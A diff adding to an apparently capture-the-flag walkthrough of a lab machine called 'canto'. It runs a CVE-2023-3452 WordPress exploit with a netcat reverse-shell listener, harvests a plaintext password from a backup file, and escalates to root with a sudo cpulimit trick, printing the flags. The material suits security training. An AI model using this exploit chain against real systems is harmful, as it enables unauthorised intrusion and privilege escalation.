@@ -250,7 +250,8 @@ Then we have to copy all the code and create a nano file
 IMPORTANTñ
 Inside of the nano we need to add the Attacker IP Address 
 
-<img width="420" height="204" alt="image" src="https://github.com/user-attachments/assets/4141301f-c8f5-458e-a750-15e498d9938a" />
+<img width="404" height="184" alt="image" src="https://github.com/user-attachments/assets/1d918792-d70d-40be-877d-83081a0db1fc" />
+
 
 Ctrl  + o , Enter , Ctrl + x to save it 
 
@@ -271,6 +272,150 @@ python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -NC_PORT 33
 ┌──(r4v3x㉿kali)-[~/Desktop]
 
 └─$ python3 CVE-2023-3452.py -u http://192.168.15.16 -LHOST 192.168.15.15 -NC_PORT 444 -s Wordpress_virus.php 
+
+
+With our payload we got access 
+
+┌──(r4v3x㉿kali)-[~/Desktop/Canto]
+└─$ sudo nc -nlvp 444
+listening on [any] 444 ...
+connect to [192.168.15.15] from (UNKNOWN) [192.168.15.16] 46270
+Linux canto 6.5.0-28-generic #29-Ubuntu SMP PREEMPT_DYNAMIC Thu Mar 28 23:46:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 17:53:41 up  1:05,  0 user,  load average: 0.01, 0.06, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$      
+
+From here we must create persistance with stty
+
+command /dev/null -c bash 
+
+CRTL + Z
+
+stty raw -echo; fg 
+
+export SHELL=bash
+export TERM=xterm 
+
+Now we will navigate until we find the user flag 
+
+www-data@canto:/$ export SHELL=bash && export TERM=xterm
+www-data@canto:/$ ls
+bin   cdrom  etc   lib    lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib64  media       opt  root  sbin  srv   tmp  var
+www-data@canto:/$ cd home
+www-data@canto:/home$ ls
+erik
+www-data@canto:/home$ cd erik
+www-data@canto:/home/erik$ ls
+notes  user.txt
+www-data@canto:/home/erik$ cat user.txt 
+cat: user.txt: Permission denied
+www-data@canto:/home/erik$ ls
+notes  user.txt
+www-data@canto:/home/erik$ cd ..
+www-data@canto:/home$ cd erik
+www-data@canto:/home/erik$ ls
+notes  user.txt
+www-data@canto:/home/erik$ cd notes
+www-data@canto:/home/erik/notes$ ls
+Day1.txt  Day2.txt
+www-data@canto:/home/erik/notes$ cat day1.txt
+cat: day1.txt: No such file or directory
+www-data@canto:/home/erik/notes$ cat Day1.txt
+On the first day I have updated some plugins and the website theme.
+www-data@canto:/home/erik/notes$ cat DAy2.txt
+cat: DAy2.txt: No such file or directory
+www-data@canto:/home/erik/notes$ cat Day2.txt
+I almost lost the database with my user so I created a backups folder.
+www-data@canto:/home/erik/notes$ 
+
+After this , I will search for the backups folder.
+
+www-data@canto:/home/erik/notes$ find / -name "backups" 2>/dev/null 
+/snap/core22/1380/var/backups
+/snap/core22/864/var/backups
+/var/backups
+/var/wordpress/backups
+www-data@canto:/home/erik/notes$ 
+
+I started looking for the options I found the following 
+
+www-data@canto:/home/erik/notes$ cd /var/wordpress/backups
+www-data@canto:/var/wordpress/backups$ ls
+12052024.txt
+www-data@canto:/var/wordpress/backups$ cat 12052024.txt
+------------------------------------
+| Users     |      Password        |
+------------|----------------------|
+| erik      | th1sIsTheP3ssw0rd!   |
+------------------------------------
+
+We will access as erik
+
+www-data@canto:/var/wordpress/backups$ su erik
+Password: 
+erik@canto:/var/wordpress/backups$ 
+
+Privilege escalation
+
+For this I run a sudo -l inthe erik profile
+
+and I found a cpulimits so I searched it in the website GTFOBins
+
+<img width="1142" height="846" alt="image" src="https://github.com/user-attachments/assets/2459ce6a-187a-43ba-b22d-abc7f3bc4feb" />
+
+I copied the sudo command and pasted it 
+
+but I modified it a little bit we add /usr/bin and at the end we replace sh for bash hit enter and we are root now 
+
+User erik may run the following commands on canto:
+    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
+erik@canto:/$ sudo /usr/bin/cpulimit -l 100 -f /bin/bash
+Process 1516 detected
+root@canto:/# whoami
+root
+root@canto:/# 
+
+User erik may run the following commands on canto:
+    (ALL : ALL) NOPASSWD: /usr/bin/cpulimit
+erik@canto:/$ sudo /usr/bin/cpulimit -l 100 -f /bin/bash
+Process 1516 detected
+root@canto:/# whoami
+root
+root@canto:/# ls
+bin   cdrom  etc   lib    lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib64  media       opt  root  sbin  srv   tmp  var
+root@canto:/# cd root
+root@canto:~# ls
+root.txt  snap
+root@canto:~# cat root.txt
+1b56eefaab2c896e57c874a635b24b49
+root@canto:~# 
+This is our toot flag and we just search for the user flag 
+
+root@canto:/usr# cd ..
+root@canto:/# find / -name "user.txt" 2>/dev/null
+/home/erik/user.txt
+root@canto:/# cd /home/erik/user.txt
+bash: cd: /home/erik/user.txt: Not a directory
+root@canto:/# cd ..
+root@canto:/# ls
+bin   cdrom  etc   lib    lost+found  mnt  proc  run   snap  sys  usr
+boot  dev    home  lib64  media       opt  root  sbin  srv   tmp  var
+root@canto:/# cd home
+root@canto:/home# ls
+erik
+root@canto:/home# cd erik
+root@canto:/home/erik# ls
+notes  user.txt
+root@canto:/home/erik# cat user.txt
+d41d8cd98f00b204e9800998ecf8427e
+root@canto:/home/erik# 
+
 
 
 
